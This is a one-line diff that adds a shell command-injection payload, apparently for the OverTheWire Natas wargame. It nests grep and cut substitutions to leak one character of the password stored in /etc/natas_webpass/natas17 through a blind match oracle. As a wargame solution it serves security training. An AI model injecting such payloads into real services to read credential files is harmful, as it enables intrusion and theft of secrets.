@@ -1,0 +1,1 @@
+$(cut -c 2 <<< $(grep $(grep $(grep $(echo e) <<< $(cut -c 1 /etc/natas_webpass/natas17)) <<< $(echo e)) <<< $(echo eB)))
